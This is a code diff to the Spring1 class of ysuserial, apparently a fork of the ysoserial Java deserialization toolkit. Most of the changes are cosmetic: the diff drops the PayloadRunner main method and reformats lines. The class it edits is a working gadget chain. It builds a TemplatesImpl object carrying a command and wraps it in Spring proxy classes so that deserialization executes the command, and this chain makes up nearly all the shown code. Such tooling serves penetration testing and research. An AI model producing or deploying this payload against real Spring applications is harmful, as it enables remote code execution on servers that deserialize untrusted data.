@@ -14,7 +14,6 @@ import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
 import org.su18.ysuserial.payloads.util.JavaVersion;
-import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.Reflections;
 
 /*
@@ -47,9 +46,9 @@ import org.su18.ysuserial.payloads.util.Reflections;
  */
 
 @SuppressWarnings({"rawtypes"})
-@Dependencies({"org.springframework:spring-core:4.1.4.RELEASE","org.springframework:spring-beans:4.1.4.RELEASE"})
-@Authors({ Authors.FROHOFF })
-public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
+@Dependencies({"org.springframework:spring-core:4.1.4.RELEASE", "org.springframework:spring-beans:4.1.4.RELEASE"})
+@Authors({Authors.FROHOFF})
+public class Spring1 implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
@@ -59,24 +58,20 @@ public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
 
 		final Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)
 				Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
-					.newInstance(objectFactoryProxy), Type.class, Templates.class);
+						.newInstance(objectFactoryProxy), Type.class, Templates.class);
 
 		final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
 				Gadgets.createMap("getType", typeTemplatesProxy),
 				forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
 
 		final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
-		final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
+		final Object      mitp     = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[]{}), 0);
 		Reflections.setFieldValue(mitp, "methodName", "newTransformer");
 
 		return mitp;
 	}
 
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(Spring1.class, args);
-	}
-
 	public static boolean isApplicableJavaVersion() {
-	    return JavaVersion.isAnnInvHUniversalMethodImpl();
-    }
+		return JavaVersion.isAnnInvHUniversalMethodImpl();
+	}
 }
